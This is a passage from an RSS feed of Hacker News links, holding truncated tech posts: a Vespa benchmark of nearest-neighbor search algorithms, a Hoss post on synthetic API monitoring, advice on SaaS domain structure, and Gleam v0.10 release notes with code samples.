<p>We benchmarked the three prototype implementations to look at indexing throughput and search throughput with different document corpus sizes.
We used the
<a href="http://corpus-texmex.irisa.fr/">1M SIFT (128 dim)</a>
and
<a href="http://corpus-texmex.irisa.fr/">1M GIST (960 dim)</a>
datasets, where one vector corresponds to a document.
In this section, we summarize the results of the 1M SIFT tests. Findings were similar with the 1M GIST dataset.</p>

<h3 id="setup">Setup</h3>
<p>The tests were executed in a CentOS 7 Docker image using Docker Desktop on a MacBook Pro (15 inch, 2018)
with a 2.6 GHz 6-Core Intel Core i7 CPU and 32GB of memory. The Docker setup was 8 CPUs, 16GB of memory and 1GB of Swap.</p>

<p>The configuration of the algorithms were as follows:</p>
<ul>
  <li><strong>Float size</strong>: 4 bytes.</li>
  <li><strong>Annoy</strong>: Number of trees = 50. Max points in leaf node = 128.</li>
  <li><strong>HNSW</strong>: Max links per node (M) = 16. Note that level 0 has 32 links per node (2*M). Number of neighbors to explore at insert (efConstruction) = 200.</li>
  <li><strong>RPLSH</strong>: 512 bits used for hash and linear scan of hash table.</li>
</ul>

<h3 id="indexing-throughput">Indexing Throughput</h3>
<p>The 1M SIFT dataset was split into chunks of first 100k, 200k, and 500k vectors,
and indexing throughput was tested with different corpus sizes.
The index structures for all algorithms started empty, and we added one document at a time to simulate real-time feeding.
One thread was used. Necessary adjustments to the prototype implementations were done to accommodate this.
Note that the data points for 10M documents are estimated based on the 100k and 1M data points.</p>

<p>Observations:</p>
<ul>
  <li>Indexing throughput depends on corpus size for Annoy and HNSW, where throughput is halved when corpus size is increased by 10x.</li>
  <li>Indexing throughput for RPLSH is independent of corpus size.</li>
  <li>Annoy is <strong>4.5 to 5 times</strong> faster than HNSW.</li>
  <li>RPLSH is <strong>23 to 24 times faster</strong> than HNSW at 1M documents.</li>
</ul>

<figure data-orig-width="1110" data-orig-height="686"><img src="https://blog.vespa.ai/assets/2020-06-30-approximate-nearest-neighbor-search-in-vespa-part-1/indexing-throughput-sift.png" data-orig-width="1110" data-orig-height="686"></figure>

<h3 id="search-throughput-qps">Search Throughput (QPS)</h3>
<p>The search throughput was measured after the indexes were built, using a single benchmarking client and search thread.
We used the query vectors from the dataset, and searched for the nearest K=100 neighbors from the query vector.
To get comparable quality results between the algorithms we had to adjust some of the parameters used.
The default behavior for Annoy is to collect K=100 candidates per tree, and then calculate brute force distance for all those.
To get comparable quality between Annoy and HNSW we had to collect 8000 candidates instead of 5000.
For RPLSH, we used the Hamming distance between hashes to pre-filter candidates after collecting 200 candidates into a heap,
skipping full distance calculation for most candidates. For HNSW, we asked for 100 candidates.</p>

<p>Observations:</p>
<ul>
  <li>HNSW outperforms Annoy and RPLSH. At corpus size 1M the QPS is <strong>9 times as high</strong> as Annoy,
and <strong>16 times as high</strong> as RPLSH at comparable quality.
Similar observations between hnswlib and Annoy are found in <a href="http://ann-benchmarks.com/">ANN Benchmarks</a>,
where the QPS of hnswlib is 5-10 times higher at the same quality on all tested datasets.</li>
  <li>The HNSW search algorithm depends heavily on the number of links between nodes, which again depends on corpus size.
The QPS is halved when the corpus size is increased by 10x.
We see the same during indexing as that uses the search algorithm to find candidates to connect to.</li>
  <li>The Annoy search algorithm is less dependent on corpus size, at least with small corpus sizes.
The static cost is driven by brute force calculation of distances for the candidate set, 8000 in this case.
With very high corpus size the cost of traversing the binary trees will likely match and exceed the static cost.
We don’t know where this limit is.</li>
  <li>For RPLSH, doing exhaustive …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.vespa.ai/approximate-nearest-neighbor-search-in-vespa-part-1/">https://blog.vespa.ai/approximate-nearest-neighbor-search-in-vespa-part-1/</a></em></p>]]>
            </description>
            <link>https://blog.vespa.ai/approximate-nearest-neighbor-search-in-vespa-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23706731</guid>
            <pubDate>Wed, 01 Jul 2020 21:08:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Synthetic Monitoring and Testing Is Not Enough]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23706379">thread link</a>) | @apitracker
<br/>
July 1, 2020 | https://www.hoss.com/blog/why-synthetic-monitoring-and-testing-is-not-enough/ | <a href="https://web.archive.org/web/*/https://www.hoss.com/blog/why-synthetic-monitoring-and-testing-is-not-enough/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-post-content=""><p>Application development is increasingly dependent upon APIs, often integrating with many different services. To address uncertainty in these dependencies, many developers use synthetic tests to monitor their API activity. This common tooling helps you discover when an API is up or down, and whether it’s returning the expected results. While useful, synthetic testing cannot mimic the reality of today’s applications.</p>
<p>When your application uses multiple services, your tests will miss:</p>
<ul>
<li>Internal microservices that don’t have public endpoints</li>
<li>Errors specific to real usage that you haven’t foreseen</li>
<li>Changes to your application after the tests are written</li>
</ul>
<p>In this post, we’ll share more about these three scenarios, and explain why real-time monitoring of live API calls is the best solution.</p>
<h2>Your Microservices Might Be Untestable</h2>
<p>Traditional synthetic testing isn’t even an option for many enterprises today. If you’re building internal APIs that are not Internet-accessible, such as popular microservices architectures, you’ll be restricted to only public interfaces. Sometimes that is enough, but for sufficiently advanced use cases, it typically means you’re leaving much of your software untested.</p>
<p>Most synthetic monitoring tools run as SaaS. You log in to a dashboard and set up your series of API calls and criteria. Then, at defined intervals, the monitor calls the endpoints—typically from cloud providers in various locations—to ensure the synthetic tests pass. To achieve this test with microservices requires that the calls can be made from within your systems, which may not be accessible by public DNS.</p>
<p>You may be able to use synthetic monitoring with simpler scenarios:</p>
<ul>
<li>An internal API running a mobile app or other frontend</li>
<li>Calling a small number of third-party APIs</li>
</ul>
<p>In both of these cases, the endpoints must be accessible to the Internet. With some manual effort, you could create tests to periodically mimic these client-side calls. With this approach, you can only monitor pre-determined request and response data to ensure it matches expectations. Not only does this testing miss issues with internal services, it also only gives you a partial view of your external calls.</p>
<h2>Synthetic Monitoring Only Tells Part of the Story</h2>
<p>The problem with synthetic monitoring is in the name: it’s synthetic. You are only testing what you’ve explicitly included. Many errors are dependent upon real usage situations—if you haven’t accounted for it, your monitoring will not catch it.</p>
<p>Synthetic tests can miss:</p>
<ul>
<li>Problems related to your application’s network</li>
<li>Edge cases based on the credentials you use</li>
<li>Bugs that only arise with dynamic request content</li>
<li>Latency not captured in a one-off test</li>
<li>Error messages sent with 200-level status codes</li>
<li>Issues you have not considered with your tests</li>
</ul>
<p>These issues only become worse if your application depends on multiple third party APIs. We found <a href="https://www.hoss.com/blog/api-consumption-insights/" target="_blank" rel="nofollow noopener noreferrer">over half of developers consume more than five APIs</a>. With the many potential points of failure, you can see why it’s tempting to set up monitors. Yet, we discovered most developers don’t monitor the external APIs they call and may not have access to a sandbox that can be easily tested.</p>
<p>To understand the full picture into API performance requires total visibility to what your application is experiencing. There are situations where synthetic tests make sense, but you cannot depend on them to capture all the issues with your application.</p>
<p>If it’s important for your customers to have an experience with limited errors, it’s critical that you go beyond synthetic tests. </p>
<h2>It’s Hard to Maintain Synthetic Tests</h2>
<p>Where synthetic monitoring makes sense is for APIs that you provide publicly or for approved partners. The surface area of tests is limited to a single API with some well-defined use cases. Third-party API monitoring is more difficult, especially if you try to cover some of the scenarios synthetic tests can miss. External <a href="https://www.hoss.com/blog/3-common-api-Integration-mistakes-and-how-to-avoid-them/" target="_blank" rel="nofollow noopener noreferrer">APIs often change without notice</a>, so tests can give you alerts when things aren’t as you expect. Then comes the hardest part: maintenance of those tests when your own app is also changing.</p>
<p>Let’s say you’ve gathered the details of every API call you make during a typical user’s experience with your application. Next, you translate those use cases into synthetic tests, so you can be alerted when it catches errors. You’ll be missing atypical user paths, but that may be a trade-off you want to make. You can publish your tests and monitor them regularly, feeling somewhat confident. As long as you don’t change anything.</p>
<p>Once you’ve built an application, it’s not done. Most software requires bug fixes, user experience enhancements, and new features. Inevitably, you’ll need to adapt how you make your calls to external APIs. Building comprehensive synthetic tests for an application that calls multiple APIs is difficult in the first place. Keeping it updated with the exact calls as your code evolves might be an impossible task.</p>
<p>Ideally, you could add some process to sync monitors with your real calls. For example, include synthetic test maintenance in your code review. An unfortunate side effect could be slower development cycles. All in the name of tests that can’t even capture every scenario.</p>
<h2>Use Real Monitoring for Real Visibility</h2>
<p>We’ve bumped into all these issues, in our development work and with Hoss customers. Whether consuming your own microservices or third party APIs, our goal is to give you <a href="https://www.hoss.com/" target="_blank" rel="nofollow noopener noreferrer">deep visibility and better customer experiences</a>. Keep track of performance based on real scenarios, not synthetic tests. You can enable error alerts and reduce the amount of time spent debugging your integrations.</p>
<p><a href="https://www.hoss.com/" target="_blank" rel="nofollow noopener noreferrer">Try Hoss for free</a> and save yourself the headache of synthetic monitoring.</p>
</div></div>]]>
            </description>
            <link>https://www.hoss.com/blog/why-synthetic-monitoring-and-testing-is-not-enough/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23706379</guid>
            <pubDate>Wed, 01 Jul 2020 20:42:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Domain Structure for SaaS Products]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23706263">thread link</a>) | @gls2ro
<br/>
July 1, 2020 | https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html | <a href="https://web.archive.org/web/*/https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>While being involved in a couple of side-projects in the last months, all of the SaaS products, I had to discuss and choose the domain architecture.</p>

<p><img src="https://ghinda.com/blog//assets/images/articles/domain-structure-full.png" alt="Domain structure for SaaS Products"></p>

<p>First, let me introduce some concepts:</p>

<ul>
  <li>Marketing website is the main website of the SaaS product dedicated mostly for attracting new customers. It is dedicated to convincing visitors to become customers, to tell a story about the product, to present showcases.</li>
  <li>product app (or SaaS app) is the actual product that is used by customers (logged in users).</li>
</ul>

<p>When I say domain architecture, I am referring to the following choices:</p>

<ol>
  <li>
    <p><strong>Should the marketing website be part of the same codebase as the product app, or should these two sites live in different codebases having their independent release cycles?</strong></p>
  </li>
  <li>
    <p><strong>Should the domain structure for the marketing website and product app be based on subdomains (like example.com and app.example.com) or based on pathnames (like example.com and example.com/app)?</strong></p>
  </li>
</ol>

<p>There is another question in case you want to offer to your customers an URL a slug (a namespace) when using your product app:</p>

<ol start="3">
  <li><strong>Should you offer the slug as a subdomain (like organisatio-namespace.example.com) or as a part of the pathname  (like example.com/organisation-namespace)?</strong></li>
</ol>

<p>Bonus question:</p>

<ol start="4">
  <li><strong>Should the blog be on a subdomain (like blog.example.com) or as a subfolder (like example.com/blog)?</strong></li>
</ol>
      <h2 id="my-recommendations">
        
        
          My recommendations <a href="#my-recommendations">#</a>
        
        
      </h2>

<p>Here are my answers to these questions:</p>

<ol>
  <li>
    <p>Use separate codebases for the product app and marketing website. Also, deploy them on separate machines. This results in less downtime when releasing them, almost no common bugs, and allowing different experiments on each one of them without the fear of affecting customers. Don’t use this when you want to display in your marketing websites live data from the product app.</p>
  </li>
  <li>
    <p>Use a subdomain structure for the separation between the marketing website and product app. This creates greater flexibility in how you generate routes for both of them (due to domain separation),  it allows you to configure CDN or separate traffic between them easily. You get a small security bonus when using per-domain settings.</p>
  </li>
  <li>
    <p>Use organization slug as a pathname, not as a subdomain. It makes the use of SSL much easier, and you have less work to do to set up organization accounts. For this, you lose the ease to route your customers to different machines based on their URLs, and it pollutes your sitemap. You need to be careful when adding routes to your marketing website not to use any customer slug.</p>
  </li>
  <li>
    <p>For this last question, the current recommendation is still to use a subfolder for your blog.</p>
  </li>
</ol>

<p>You can read more about why I recommend these at the end of this article.</p>
    <hr>

<p>Let’s go and explore the advantages and disadvantages of each strategy.</p>

<p>I explore what kind of recommendations I found at the first search and then try to give my own arguments for this.</p>
      <h2 id="review-of-some-existing-recommendations">
        
        
          Review of (some) existing recommendations <a href="#review-of-some-existing-recommendations">#</a>
        
        
      </h2>

<p><em>1. IndieHackers Discussion</em></p>

<p><a href="https://www.indiehackers.com/forum/questions-for-saas-founders-0519d4f95e" target="_blank" rel="noopener">Here</a> is an interesting discussion about organizing the domain structure of a SaaS. This discussion is mainly referring to how to organize the main website (marketing website) with</p>

<p>In that thread there are proposed 2 solutions:</p>

<p>A. Main website on example.com and SaaS product at subdomain.example.com like:</p>
<ul>
  <li>Main website or marketing website at <code>https://example.com</code>
</li>
  <li>SaaS app living at subdomain.example.com, with the following examples:
    <ul>
      <li><code>app.example.com</code></li>
      <li><code>dashboard.example.com</code></li>
      <li><code>admin.example.com</code></li>
      <li><code>my.example.com</code></li>
    </ul>
  </li>
</ul>

<p>B. Main website at example.com and SaaS product living at example.com/folder  like:</p>
<ul>
  <li>Admin at <code>example.com/admin</code>
</li>
  <li>App at <code>example.com/dashboard</code>
</li>
  <li>Blog at <code>example.com/blog</code>
</li>
  <li>API at <code>example.com/api</code>
</li>
</ul>

<p>The main reasons for going for subdomain structure (option A):</p>

<p>a. SEO concern: when the SEO is important only for the marketing website and when the SaaS product itself, it is not part of the SEO strategy and should not be indexed.</p>

<p>b. It is easy to segment the traffic in case of heavy load and assure some kind of QoS</p>

<p>c. It is easy to setup Cloudflare or CDN when traffic increases when a subdomain structure</p>

<p>d. It is easy to setup difference services like example.com to <a href="https://www.netlify.com/" target="_blank" rel="noopener">Netlify</a>, app.example.com to <a href="https://www.heroku.com/" target="_blank" rel="noopener">Heroku</a> and blog.example.com to <a href="https://write.as/pro" target="_blank" rel="noopener">Write.as</a> for example.</p>

<p>d. Improved security by separation of concerns, even it is not clear there is the security is better only because of the subdomain structure, or it is a side effect of hosting them on difference resources</p>

<p>The main reason for choosing the folder structure (option B):</p>
<ol>
  <li>When there is a need to share data between the SaaS product and marketing website for SEO  (like the number of users who applied so far …)</li>
  <li>Keeping everything in the same codebase facilitates code reuse thus increasing productivity</li>
  <li>Speed of development and fewer ops needed to maintain the infrastructure</li>
</ol>

<p><em>2. Clubhouse article about using a single subdomain</em></p>

<p><a href="https://clubhouse.io/blog/building-a-saas-app-you-should-probably-stick-to-a-single-subdomain-455695e1d03c/" target="_blank" rel="noopener">Here</a> is the article from Clubhouse written by Andrew Childs, Chief Design Officer and Co-founder of Clubhouse.</p>

<p>Here is a quote from that article explaining their recommendation:</p>
<blockquote>
  <p>If you’re building a SaaS app that has any third-party OAuth integrations, or your product allows a user to switch between multiple organizations, you should put the organization in the pathname and use a single subdomain (like “app”) for your application.</p>
</blockquote>

<p>Key takeaways from the article:</p>
<ol>
  <li>Having the organization slug  in the pathname makes it easier to switch organizations and to work with different URLs in dev/staging and production</li>
  <li>It is easier to whitelist the domain in case you are working with OAuth providers (as you only need to whitelist a single domain). In this case, you don’t need to rely on third-party providers to support wildcard domains.</li>
  <li>It allows us to get an Extended Validation SSL certificate as these are not assigned to wildcard domains.</li>
</ol>

<p><em>3. Winderwind - How to select a future-proof subdomain structure</em></p>

<p>Source of the article is <a href="https://winterwindsoftware.com/how-to-select-a-future-proof-subdomain-structure-for-saas-web-app/" target="_blank" rel="noopener">here</a></p>

<p>The article recommends the following structure:</p>
<ol>
  <li>The marketing website should be on the main domain and separated from the product app</li>
  <li>The product app should live on its own subdomain. Here are some suggestions from the article:
a. <em>dashboard</em> – Used by  <a href="https://stripe.com/" target="_blank" rel="noopener">Stripe</a> 
b. <em>manage</em> – Used by  <a href="https://gocardless.com/" target="_blank" rel="noopener">GoCardless</a> 
c. <em>portal</em> – This is what I use for  <a href="https://autochart.io/" target="_blank" rel="noopener">Autochart</a> 
d. <em>my</em> – Used by  <a href="https://www.xero.com/" target="_blank" rel="noopener">Xero</a> 
e. <em>account</em> – Used by  <a href="https://postmarkapp.com/" target="_blank" rel="noopener">Postmark</a> 
f. <em>secure</em> – Used by  <a href="https://helpscout.net/" target="_blank" rel="noopener">HelpScout</a>
</li>
  <li>Keep the marketing site and the blog on the same domain</li>
  <li>Keep the API on the same subdomain as the product app</li>
</ol>

<p>Reasons for separating the marketing website and product app from the article are:</p>
<ol>
  <li>It makes it easy to work with non-technical people on the marketing website and minimizes downtime when upgrading them</li>
  <li>It allows using static CDN for the marketing website</li>
</ol>
    
      <h2 id="arguments-for-my-recommendations">
        
        
          Arguments for my recommendations <a href="#arguments-for-my-recommendations">#</a>
        
        
      </h2>
    
      <h3 id="use-separate-codebases-for-product-app-and-marketing-website">
        
        
          Use separate codebases for product app and marketing website <a href="#use-separate-codebases-for-product-app-and-marketing-website">#</a>
        
        
      </h3>
    
      <h4 id="reasons-for-separate-codebase">
        
        
          Reasons for separate codebase <a href="#reasons-for-separate-codebase">#</a>
        
        
      </h4>

<p>Even if you are a single owner of your project, it makes sense to have this split between codebases because it will first and foremost make sure bugs don’t leak between these two components. Imagine a bug in your CSS/JS flow while trying to fix something on the marketing website that might impact your customers who are using your product app. It makes the testing easier because you can have different test coverage and test thoroughness, allowing you, for example, to say that the marketing website should only pass several N positive scenarios without being concerned with negative scenarios.</p>

<p>The second biggest advantage is having different release schedules between them. You can play more easily with the marketing website (A / B testing, testing copywrite, SEO tags) and release them as often as you like without any (let’s say this again without any) concern for a possible effect of your existing customers of the product app. It decreases downtime for users of the product app. You don’t need to restart product app services each time you want to add/change/remove a text from the marketing website.</p>

<p>The third advantage is related to the ability to use different frameworks and languages for marketing website than for the product app, thus allowing you also to use different hosting services if you like without having to create a complicated release process. You can decide to make your marketing website a static website generated by Jekyll or Middleman or Ghost and then release it to Netlify while using Ruby or Python or Elixir for your product app and host them on AWS or Heroku or Digital Ocean.</p>
    
      <h4 id="concerns-against">
        
        
          Concerns against <a href="#concerns-against">#</a>
        
        
      </h4>

<p>First, DO NOT DO separate codebases if you plan to show live data (or as fresh as possible) in your marketing website from your product app (like the number of accounts created so far …). In this case, you need to create and maintain an API server and client with maybe authentication or at least a security layer, and there is no need for this.</p>

<p>The biggest concern is related to the branding synchronization among the two projects. You need to have consistent branding (using the same colors, fonts, sizes, elements). This impairs your speed when changing these attributes. For this, there is no quick fix. 
What can be done is creating a separate project where you maintain your CSS and JS, maybe also some HTML components, and then use two in your two projects. Of course, this comes with extra maintenance overhead.</p>

<p>The second concern is the overhead needed to maintain two codebases and their release scripts. There is, in the beginning, a small overhead to setup CI/CD for both projects with most of the time spent into creating the automated testing environment.</p>

<p>The third concern is code reuse, especially if you are using the same …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html">https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html</a></em></p>]]>
            </description>
            <link>https://ghinda.com/blog/products/2020/domain-structure-for-saas-products.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23706263</guid>
            <pubDate>Wed, 01 Jul 2020 20:33:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[V0.10 of Gleam, a statically typed language for the Erlang VM, is out]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23706211">thread link</a>) | @eterps
<br/>
July 1, 2020 | https://lpil.uk/blog/gleam-v0.10-released/ | <a href="https://web.archive.org/web/*/https://lpil.uk/blog/gleam-v0.10-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <p>1 month and 10,910 lines of code later it is time for another Gleam
release! Let’s see what’s new this time.</p>

<h2 id="module-constants">Module constants</h2>

<p>Sometimes we want to use a certain fixed value in multiple places in our
project. Until now we’ve had two options. The first option was to copy and
paste the value into multiple places in our code.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>2101</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>2101</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>2111</span>
<span>}</span>
</code></pre></div></div>

<p>Duplication of values like this is error prone, especially if we want to
update the values later, as we’ll need to find every place it’s used in order
to change it.</p>

<p>Another option is to wrap the value in a function.</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>start_year</span><span>()</span> <span>-&gt;</span> <span>Int</span> <span>{</span>
  <span>2101</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>end_year</span><span>()</span> <span>-&gt;</span> <span>Int</span> <span>{</span>
  <span>2111</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>start_year</span><span>()</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>start_year</span><span>()</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>end_year</span><span>()</span>
<span>}</span>
</code></pre></div></div>

<p>This is better than copying the value in our code, but isn’t yet ideal. A
function can perform any amount of computation (with side effects!) when it is
called, so we have to read the definition of the function to be sure what it
does.</p>

<p>To make matters worse Gleam’s case clause guards don’t support calling of
functions within them, so this code will be rejected by the compiler:</p>

<div><div><pre><code><span>pub</span> <span>describe</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
  <span>case</span> <span>year</span> <span>{</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&lt;</span> <span>start_year</span><span>()</span> <span>-&gt;</span> <span>"Before"</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&gt;</span> <span>end_year</span><span>()</span> <span>-&gt;</span> <span>"After"</span>
    <span>_</span> <span>-&gt;</span> <span>"During"</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>To solve all these problems Gleam now has module constants. They are always
inlined by the compiler, and can be used in case clause guards.</p>

<p>Using them the above code can be rewritten like so:</p>

<div><div><pre><code><span>pub</span> <span>const</span> <span>start_year</span><span>:</span> <span>Int</span> <span>=</span> <span>2101</span>
<span>pub</span> <span>const</span> <span>end_year</span><span>:</span> <span>Int</span> <span>=</span> <span>2111</span>

<span>pub</span> <span>fn</span> <span>is_before</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>year</span> <span>&lt;</span> <span>start_year</span>
<span>}</span>

<span>pub</span> <span>fn</span> <span>is_during</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>Bool</span> <span>{</span>
  <span>start_year</span> <span>&lt;=</span> <span>year</span> <span>&amp;&amp;</span> <span>year</span> <span>&lt;=</span> <span>end_year</span>
<span>}</span>

<span>pub</span> <span>describe</span><span>(</span><span>year</span><span>:</span> <span>Int</span><span>)</span> <span>-&gt;</span> <span>String</span> <span>{</span>
  <span>case</span> <span>year</span> <span>{</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&lt;</span> <span>start_year</span> <span>-&gt;</span> <span>"Before"</span>
    <span>year</span> <span>if</span> <span>year</span> <span>&gt;</span> <span>end_year</span> <span>-&gt;</span> <span>"After"</span>
    <span>_</span> <span>-&gt;</span> <span>"During"</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Much better! Module constants are going to provide the basis of some exciting
new features in future, so watch this space. 🚀</p>

<p>Thanks to <a href="https://github.com/thehabbos007">Ahmad Sattar</a> for taking the
lead in the implementation of this feature.</p>

<h2 id="bit-string-syntax">Bit string syntax</h2>

<p>One of great things about Erlang is how easy it is to work with raw bits and
bytes using the bit string literal syntax. Starting with this release Gleam
supports this too!</p>

<p>Explaining all the things one can do with the bit string syntax would take
longer than I have now, but in short they give a declarative way of
constructing and parsing raw data of any format. What’s more the Erlang VM is
highly optimised for this, so bit syntax is highly efficient too!</p>

<p>For example, if I wanted to create a 4 byte unsigned little endian integer
with the value of 100 I could do so using bit syntax like this:</p>

<div><div><pre><code><span>let</span> <span>my_integer</span> <span>=</span> <span>&lt;&lt;</span><span>100</span><span>:</span><span>unsigned</span><span>-</span><span>little</span><span>-</span><span>int</span><span>-</span><span>size</span><span>(</span><span>4</span><span>)</span><span>&gt;&gt;</span>
</code></pre></div></div>

<p>Or if I wanted to extract the title, artist, album, year, and comment from an
MP3 music file’s ID3 tags I could pattern match on it like this:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>get_metadata</span><span>(</span><span>id3</span><span>:</span> <span>BitString</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>(</span><span>Metadata</span><span>,</span> <span>String</span><span>)</span> <span>{</span>
  <span>case</span> <span>id3</span> <span>{</span>
    <span>&lt;&lt;</span>
      <span>"TAG"</span><span>:</span><span>utf8</span><span>,</span>
      <span>title</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>artist</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>album</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>year</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>4</span><span>),</span>
      <span>comment</span><span>:</span><span>utf8</span><span>-</span><span>size</span><span>(</span><span>30</span><span>),</span>
      <span>_</span><span>rest</span><span>:</span><span>binary</span><span>,</span>
    <span>&gt;&gt;</span> <span>-&gt;</span> <span>Ok</span><span>(</span><span>Metadata</span><span>(</span><span>title</span><span>,</span> <span>artist</span><span>,</span> <span>album</span><span>,</span> <span>year</span><span>,</span> <span>comment</span><span>))</span>

    <span>_</span> <span>-&gt;</span> <span>Error</span><span>(</span><span>"Not a valid ID3 tag"</span><span>)</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Thanks to <a href="https://benjamintan.io/blog/2014/06/10/elixir-bit-syntax-and-id3/">Benjamin Tan’s blog post</a>
for this example.</p>

<p>For another example of bit syntax in action check out this <a href="https://github.com/lpil/ecoji/"><em>very serious</em>
base64 encoding alternative</a> which converts arbitrary data into emojis!</p>

<p>As part of this new feature we have introduced <code>BitString</code> and <code>UtfCodepoint</code>
types into the prelude, and split the standard library <code>Iodata</code> type into
<a href="https://hexdocs.pm/gleam_stdlib/gleam/string_builder/"><code>StringBuilder</code></a> and <a href="https://hexdocs.pm/gleam_stdlib/gleam/bit_builder/"><code>BitBuilder</code></a> types, which
are for efficiently constructing strings and bit strings respectively.</p>

<p>Thanks to <a href="https://github.com/tomwhatmore">Tom Whatmore</a> for taking the
lead in the implementation of this feature.</p>

<h2 id="the-rest">The rest</h2>

<p>There are many more new additions, improvements, and bug fixes to the compiler and
the standard library, including but not limited to support for regex expressions
(implemented by <a href="https://github.com/eterps/">Erik Terpstra</a>) and environment
variables (implemented by <a href="https://github.com/crowdhailer/">Peter Saxton</a>).</p>

<p>For information on the rest in this release please check out the <a href="https://github.com/gleam-lang/gleam/blob/main/CHANGELOG.md#v0100---2020-07-01">Gleam
changelog</a> and the <a href="https://github.com/gleam-lang/stdlib/blob/main/CHANGELOG.md#v0101---2020-07-01">standard library
changelog</a>.</p>

<h2 id="supporting-gleam">Supporting Gleam</h2>

<p>If you would like to help make strongly typed programming on the Erlang
virtual machine a production-ready reality please consider <strong><a href="https://github.com/sponsors/lpil">sponsoring
Gleam</a></strong> via the GitHub Sponsors program.</p>

<p>This release would not have been possible without the support of all the
people who have <a href="https://github.com/sponsors/lpil">sponsored</a> and contributed
to it, so a huge thank you to them.</p>

<ul>
  <li><a href="https://github.com/adelarsq">Adelar da Silva Queiróz</a></li>
  <li><a href="https://github.com/thehabbos007">Ahmad Sattar</a></li>
  <li><a href="https://github.com/scripttease">Al Dee</a></li>
  <li><a href="https://github.com/bees">Arian Daneshvar</a></li>
  <li><a href="https://github.com/arnodirlam">Arno Dirlam</a></li>
  <li><a href="https://github.com/benmyles">Ben Myles</a></li>
  <li><a href="https://github.com/bdusauso">Bruno Dusausoy</a></li>
  <li><a href="https://github.com/nono">Bruno Michel</a></li>
  <li><a href="https://github.com/starbelly">Bryan Paxton</a></li>
  <li><a href="https://github.com/worldofchris">Chris Young</a></li>
  <li><a href="https://github.com/tlvenn">Christian Meunier</a></li>
  <li><a href="https://github.com/xtian">Christian Wesselhoeft</a></li>
  <li><a href="https://github.com/cleverbunny">Clever Bunny LTD</a></li>
  <li><a href="https://github.com/davydog187">Dave Lucia</a></li>
  <li><a href="https://github.com/rawkode">David McKay</a></li>
  <li><a href="https://github.com/dym-sh">Dym Sohin</a></li>
  <li><a href="https://github.com/eterps">Erik Terpstra</a></li>
  <li><a href="https://github.com/namoscagnm">Gustavo Martins</a></li>
  <li><a href="https://github.com/hsnyildiz">Hasan YILDIZ</a></li>
  <li><a href="https://github.com/hendi">Hendrik Richter</a></li>
  <li><a href="https://github.com/hindenbug">hindenbug</a></li>
  <li><a href="https://github.com/Kleidukos">Hécate</a></li>
  <li><a href="https://github.com/jamesmacaulay">James MacAulay</a></li>
  <li><a href="https://github.com/badboy">Jan-Erik Rediger</a></li>
  <li><a href="https://github.com/Jwsonic">John Palgut</a></li>
  <li><a href="https://github.com/josevalim">José Valim</a></li>
  <li><a href="https://github.com/oneness">Kasim Tuman</a></li>
  <li><a href="https://github.com/lawik">Lars Wikman</a></li>
  <li><a href="https://github.com/leandrocp">Leandro Cesquini Pereira</a></li>
